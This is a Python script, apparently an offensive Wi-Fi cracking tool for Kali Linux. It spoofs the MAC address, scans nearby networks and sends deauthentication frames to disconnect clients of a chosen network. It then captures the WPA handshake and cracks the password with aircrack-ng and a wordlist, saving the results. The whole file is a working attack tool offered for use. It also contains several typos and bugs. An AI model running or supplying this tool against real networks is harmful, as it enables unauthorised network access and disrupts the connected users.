#!/usr/bin/env pythnon
#
# This Program written with Kali linux In Mind, not Mac or Ubuntu	
#
# When Program Is Done It Will Save The Capture list and Password to the Desktop In a Folder named F-Cipher
#
# By: Ethical H4CK3R

from os import system,path,mkdir,devnull,getuid,remove,renames,makedirs
from random import choice,randint,sample
from sys import exit,stdout
from shutil import rmtree
from subprocess import *
from itertools import *
from argparse import *
from time import sleep
from csv import reader
from re import search

class Interface(object):
	"""
	     Works With Interface
	"""
	
	def __init__(self):
		self.Success = False
		self.Found = False
		

	def Macchanger(self, iface):
		"""
		     To Spoof Mac Address
		"""
		x=0;rpt=0
		alpha=sample('ABCDEF',6)
		num=sample('1234567890',10)
		
		for i,k in zip(alpha,num):
			flip = randint(1,3)
			flip2 = randint(1,2) 
			flip3 = randint(1,9)
			if flip == 1: yield ('{}{}'.format(i,k))
			elif flip == 2: yield ('{}{}'.format(k,i))
			if flip == 3:
				if rpt != 1 and flip3 == 7 : yield ('{}{}'.format(i,i));rpt+=1
						
				elif rpt  != 1 and flip3 == 3: yield ('{}{}'.format(k,k));rpt+=1
						
				else: 
					if flip2 != 2: yield ('{}{}'.format(i,k))
					else: yield ('{}{}'.format(k,i))
			
			if x != 5:
				x+=1;yield ':'


	def FindInterface(self):
			global iface	
			"""
			     To Find Interface
			"""
			for i in range(10):
				iface = str('wlan%d'%i);
				Popen(['ifconfig',iface,'down'],stderr=PIPE,stdout=PIPE)
				Popen(['ifconfig',iface,'up'],stderr=PIPE,stdout=PIPE)
				Mssg = Popen(['ifconfig'],stderr=PIPE,stdout=PIPE)			
				Output = search('{}'.format(str(iface)),str(Mssg.communicate()))
				if Output: self.Found = True;break
			if self.Found: return iface
			else: 
				call('clear');iface = raw_input('Enter your Interface: ');sleep(0.7);call(['clear']);sleep(0.7)
				if len(str(iface)) == 0: FinInterface()
				else: 
					Popen(['ifconfig',iface,'down'],stderr=PIPE,stdout=PIPE)
					Popen(['ifconfig',iface,'up'],stderr=PIPE,stdout=PIPE)
					Mssg = Popen(['ifconfig'],stderr=PIPE,stdout=PIPE)			
					Output = search('{}'.format(str(iface)),str(Mssg.communicate()))
					if Output: self.Found = True;return iface
					else: call('clear');exit('[!] Can\'t Seem to Find: {}' .format(iface))
	
	def Change_Mac(self, iface):
		"""
		    Get Current Mac & Spoof Mac
		"""
		
		Popen(['ifconfig',iface,'down'],stderr=PIPE,stdout=PIPE)
		Popen(['iwconfig',iface,'mode','managed'],stderr=PIPE,stdout=PIPE)
		Popen(['ifconfig',iface,'up'],stderr=PIPE,stdout=PIPE)
		
		ifconfig = Popen(['ifconfig',iface],stderr=PIPE, stdout=PIPE)
		if search('ether',str(ifconfig.communicate())):
			ifconfig = Popen(['ifconfig',iface],stderr=PIPE, stdout=PIPE)
			Check=list(ifconfig.communicate())
			
			Macs={}
			Mac=[]

			for i in Check[0]:
				Mac.append(i)

			k = Mac[83:101]
			old = (''.join(k))
			Macs['OldMac'] = old
			macchanger = Interface()
			Macs['NewMac']  = (''.join(macchanger.Macchanger(iface)))
			if not self.Success:
				if Macs['NewMac'] == Macs['OldMac']: del Macs['NewMac'];Macs['NewMac']  = (''.join(macchanger.Macchanger(iface)))
				else: self.Success = True
			Newmac=Macs['NewMac'];
			
				
			
		else:
		 if not self.Success: 
			Newmac = (''.join(Macchanger(iface)));
			ifconfig = Popen(['ifconfig',iface],stderr=PIPE, stdout=PIPE)
			if search('{}' .format(str(Newmac)),str(ifconfig.communicate())):  Newmac = (''.join(Macchanger(iface)))
			else: self.Success = True
		call (['ifconfig',iface,'down'], stderr=PIPE, stdout=PIPE)
		call (['iwconfig',iface,'mode','monitor'], stderr=PIPE, stdout=PIPE)
		call (['macchanger','-m',Newmac,iface], stderr=PIPE, stdout=PIPE)
		call (['ifconfig',iface,'up'], stderr=PIPE, stdout=PIPE)
		
		
		 
class Engine(object):
	"""
	    Wifi Stuff Happens Here	
	"""
	def __init__(self,iface):
		self.Captured_Handshake = False
		self.Password_Found = False
		self.iface = iface
		self.runtime = 8
		self.Wrk = str(Wrk_Dir+'Networks-01.csv')
		self.clients  = []
		self.Bssids   = []
		self.Essids   = []
		self.Channels = []
		self.Cracked  = []
		
		with open('/root/Desktop/F-Cipher/Bssids.txt', 'r') as Already_Cracked:
		 for mac in Already_Cracked:
		  if mac != '': self.Cracked.append(str(mac).strip())
		
		
	
	def Display(self):
		"""
		    Display To The User The Networks That Are Around
		"""
		global num,size,Essids,Bssids,Channels
		try:
		 with open(self.Wrk,'r') as Clients:
		   Data = reader(Clients, delimiter=',')
		   for line in Data:
		 	 if len(line) == 7:
			   client = str(line[5]).strip()
			   if client != 'BSSID'.strip() and client not in self.clients: 
				self.clients.append(client)
		except IOError: Main()
					
		with open(self.Wrk, 'r') as AccessPoints:
		  Data = reader(AccessPoints, delimiter=',')
		  for line in Data:
			if len(line) >= 10:
			 try:
			   power= (str(line[8]).strip());name=(str(line[13]).strip())
			   chan=(str(line[3]).strip());bssid=(str(line[0]).strip())
			   if name == 'ESSID' or power == 'PWR'.strip() or power == '-1' or name == '': pass 
			   else:
				 
			          if len(name) > 9: name = name[:9]

			   	  if  num == 0 and bssid in self.clients and bssid not in self.Bssids and bssid not in self.Cracked:
					call(['clear'])
					print ('Num\tPower\tChan\tClient\tEssid\n\n{}\t{}\t{}\t{}\t{}'.format(num,power,chan,'yes',name));sleep(0.2)
					self.Bssids.append(bssid);self.Essids.append(name);self.Channels.append(chan);num+=1

				  if num == 0 and bssid not in self.clients and bssid not in self.Bssids and bssid not in self.Cracked:
					call(['clear'])
					print ('Num\tPower\tChan\tClient\tEssid\n\n{}\t{}\t{}\t{}\t{}'.format(num,power,chan,'no',name));sleep(0.2)
					self.Bssids.append(bssid);self.Essids.append(name);self.Channels.append(chan);num+=1

				  if num != 0 and bssid in self.clients and bssid not in self.Bssids and bssid not in self.Cracked:
					print ('{}\t{}\t{}\t{}\t{}'.format(num,power,chan,'yes',name));sleep(0.2)
					self.Bssids.append(bssid);self.Essids.append(name);self.Channels.append(chan);num+=1

				  if num != 0 and bssid not in self.clients and bssid not in self.Bssids and bssid not in self.Cracked:
					print ('{}\t{}\t{}\t{}\t{}'.format(num,power,chan,'no',name));sleep(0.2)
					self.Bssids.append(bssid);self.Essids.append(name);self.Channels.append(chan);num+=1
			 except: pass
				 
		size = len(self.Bssids)
		Bssids = self.Bssids
		Essids = self.Essids
		Channels = self.Channels
		remove(self.Wrk)
		
					 
	def ScanIt(self):
		"""
		     Scan The Area
		"""
		cmd = ['airodump-ng','-a','--output-format', 'csv', '-w','/tmp/F-Cipher/Networks',self.iface]
		scan = Popen(cmd,stderr=Devnull,stdout=Devnull);sleep(self.runtime);call(['pkill', 'airodump-ng'])

	def Grab_Info(self):
		global new_chan,new_Info,new_scan,client
		runtime=6
		Good=False
		Found_Target=False
		if not loop: client+=1
		if client == 3: Exit(iface,False,True,'There no clients connected to: {}'.format(essid))
		cmd=['airodump-ng','--output-format','csv','-w','/tmp/F-Cipher/Info',iface]
		run = Popen(cmd,stdout=Devnull,stderr=Devnull);sleep(runtime);call(['pkill','airodump-ng']);
		Info_Csv='/tmp/F-Cipher/Info-01.csv'
		with open(Info_Csv,'r') as Info:
		 Data = reader(Info,delimiter=',')
		 for data in Data:
			if len(data) >= 10:
				if str(data[0]).strip() == bssid.strip():
					Good=True
					str(data[3]).strip() != chan
					new_chan = str(data[3]).strip()
					new_scan=False;Found_Target=True					
		if not Found_Target: Exit(iface,False,True,'Accesspoint \'{}\' is too far'.format(essid))
	         

	def Handshake(self):
		"""
		    Capture Handshake
		"""
		global Handshake_Found,Attks,new_Info,new_scan,chan,Delete_Garbage
		scantime=5
		if new_Info: chan = new_chan
		call(['clear']);print('[-] Scanning: {}...'.format(essid))
		cmd1=['airodump-ng','--bssid',bssid,'--essid',essid,'-c',chan,'--ig','--output-format','cap','-w','/tmp/F-Cipher/{}'.format(essid),iface]
		cmd2=['aireplay-ng','-0','1','-a',bssid,'--ig',iface]
		cmd3=['aircrack-ng','/tmp/F-Cipher/{}-01.cap'.format(str(essid))]
		
		Scan_Target=Popen(cmd1,stdout=Devnull,stderr=Devnull)
		sleep(scantime);call (['pkill','airodump-ng &>/dev/null'])
		Check=Popen(cmd3,stderr=PIPE,stdout=PIPE);Check.wait()

		for output in Check.communicate():
		 if 'WPA' in output or 'Choosing first network as target' in output:
		   if  '1 handshake' in output: call(['clear']);sleep(0.7);Delete_Garbage=False;Handshake_Found=True
		   if  '0 handshake' in output: 
			Strike = Popen(cmd2,stdout=Devnull,stderr=Devnull);Strike.wait();Attks+=1; 
			if Attks == 3: Attks=0;new_scan=True
		 if 'No networks found, exiting.' in output: call(['clear']);Attks=0;new_scan=True
	
	def Aircrack(self):
		"""
		    Run Aircrack
		"""
		global Found_Password,SaveIt_As,Handshake
		
		Handshake='/tmp/F-Cipher/{}-01.cap'.format(essid)
		SaveIt_As = '/tmp/F-Cipher/{}.txt'.format(essid)
		
		cmd = ['aircrack-ng',Handshake,'-l',SaveIt_As,'-w',Passwordlist]
		try:
			if show:
			 Aircrack = Popen(cmd);
			else: call('clear');print'[+] Cracking Password...';Aircrack = Popen(cmd,stdout=Devnull,stderr=Devnull)
			Aircrack.wait()
			if path.exists(str(SaveIt_As)):
				Found_Password=True
		except KeyboardInterrupt: call(['pkill','aircrack-ng']);call(['clear']);return
				
def Main():
	"""
             Main Process
	"""
	global Handshake_Found;Handshake_Found = False
	global Found_Password;Found_Password = False
	global Delete_Garbage;Delete_Garbage = True
	global new_Info;new_Info = False
	global new_scan;new_scan = False
	global loop;loop = False
	global show;show = False
	global client;client=0
	global Hndshake_Dir
	global Passwordlist
	global Devnull
	global Wrk_Dir
	global bssid
	global essid	
	global Attks
	global chan
	global num
	
	
	# Check The User Side Of Things
	Devnull = open(devnull, 'w');
        P = ArgumentParser()
        P.add_argument('Wordlist', help='The password list to use for cracking');
	P.add_argument('-s','--show', help='Show the output of aircrack', dest='show', action='store_true')
	P.add_argument('-l','--loop', help='Wait for clients don\'t exit', dest='loop', action='store_true')
        args = P.parse_args();
	if args.show: show=True
	if args.loop: loop=True
	Passwordlist=str(args.Wordlist)
        if path.exists(args.Wordlist):
         with open(Passwordlist,'r') as list:
          passwrds = list.readlines()
	  if len(passwrds) < 3: call(['clear']);exit('[!] Please Populate: {}' .format(Passwordlist))
	else: call(['clear']);exit('[!] Can\'t locate: {}'.fomat(Passwordlist))

	# SetUp Enviroment 
	Wrk_Dir = '/tmp/F-Cipher/'
	Hndshake_Dir = '/root/Desktop/F-Cipher/'
	Bssid_Dir = '/root/Desktop/F-Cipher/Bssids.txt'
	Essid_Dir = '/root/Desktop/F-Cipher/Essids'
        if not path.exists(Wrk_Dir): mkdir(Wrk_Dir)
	else: rmtree(Wrk_Dir);mkdir(Wrk_Dir)
	if not path.exists(Hndshake_Dir): mkdir(Hndshake_Dir);system('touch {}'.format(Bssid_Dir))
	if not path.exists(Bssid_Dir): system('touch {}'.format(Bssid_Dir))
	if not path.exists(Essid_Dir): mkdir(Essid_Dir)
	

	# Shutting Down Some Few Things
	Proc = Popen(['ps','cax'],stdout=PIPE, stderr=PIPE)
	for processes in Proc.communicate():
		if 'aircrack-ng' in processes: call(['pkill','aircrack-ng'])
		if 'airodump-ng' in processes: call(['pkill','airodump-ng'])
		if 'aireplay-ng' in processes: call(['pkill','aireplay-ng'])

	Proc2 = Popen(['service','network-manager','status'],stdout=PIPE, stderr=PIPE)
	for message in Proc2.communicate():
	 	if 'running' in message: call (['service','network-manager','stop'])
	
	
        # Enable Monitor Mode
	Mon_Mode = Interface()
	Mon_Mode.FindInterface()
	try: Mon_Mode.Change_Mac(iface)
	except NameError: Main()
	
	
	# Start The Engine & Scan
	num=0
	call(['clear'])
	print ('[-] Scanning...')	
	engine = Engine(iface)
	while 1:
	 try: engine.ScanIt();engine.Display();
	 except KeyboardInterrupt: call (['pkill','airodump-ng &>/dev/null']);break
	try:
	   sleep(0.2);
	   try: len(Bssids)
	   except NameError: Main()
	   i = int(input('\nEnter a num: '))
	   if len(str(i)) == 0: Exit(iface,False,False,'Can\'t leave this field empty')
	   if i > int(size-1): Exit(iface,False,False,'The number {} is not part of the numbers'.format(i))
        except KeyboardInterrupt: Exit(iface,True,True,None)
	try: remove('/tmp/F-Cipher/Networks-01.csv')
	except: pass 
	chan = Channels[i]
	bssid = Bssids[i]
	essid = Essids[i]
	
	# Capture Handshake
	Attks=0;call(['clear'])
	while not Handshake_Found:
	 try: 
	  engine.Handshake();
	  if Delete_Garbage: system('rm /tmp/F-Cipher/*'.format(essid))
	  if new_scan: engine.Grab_Info()
	 except KeyboardInterrupt: Exit(iface,True,True,None)
	
	# Start Aircrack
	engine.Aircrack()
	
	# Results
	Destin_Dir = '/root/Desktop/F-Cipher/Essids/{}'.format(essid,essid)
	if path.exists(Destin_Dir):
	 k=2;Path_Found=True
	 while Path_Found:
	  Destin_Dir = '/root/Desktop/F-Cipher/Essids/{}({})'.format(essid,str(k))
	  if not path.exists(Destin_Dir): Path_Found=False
	  else: k+=1
	makedirs(Destin_Dir)
	if Found_Password:
	  call(['clear'])
	  renames('{}'.format(Handshake), '{}/{}.cap'.format(str(Destin_Dir),essid))
	  with open(SaveIt_As) as password:
	    for key in password:
	      print '[+] Password Found: {}'.format(str(key))
	  renames('{}'.format(SaveIt_As), '{}/{}.txt'.format(str(Destin_Dir),essid))
	  with open(Bssid_Dir, 'a') as File:
	    File.write('{}\n'.format(bssid))
	  Exit(iface,False,False,None)
	else: 
          call(['clear'])
	  print '[!] Password Not Found';
	  renames('{}'.format(Handshake), '{}/{}.cap'.format(str(Destin_Dir),essid))
	  Exit(iface,False,False,None)

def Exit(iface,disply,cls,err):
	'''
	   Clean Up
	'''
	
	# Stop Processes
	Proc = Popen(['ps','cax'],stdout=PIPE, stderr=PIPE)
	for processes in Proc.communicate():
		if 'aircrack-ng' in processes: call(['pkill','aircrack-ng'])
		if 'airodump-ng' in processes: call(['pkill','airodump-ng'])
		if 'aireplay-ng' in processes: call(['pkill','aireplay-ng'])

	# Welcome Back, Manager Mode
	call (['ifconfig',iface,'down'])
	call (['iwconfig',iface,'mode','managed'])
	call (['ifconfig',iface,'up'])
	call (['service','network-manager','restart'])

	# Take Out The Trash
	call (['rm', '/tmp/F-Cipher', '-rf'])
	
	# Decide What Message To Show & Exit
	if cls: call (['clear'])
	if err: print '[!] Error Message: %s' %(str(err))
	if disply: exit('[+] Exit Algorithm Completed')
	else: exit()

if __name__ == '__main__':
   if getuid() == 0: Main()
   else: call(['clear']); exit('[!] Root Access Required')		
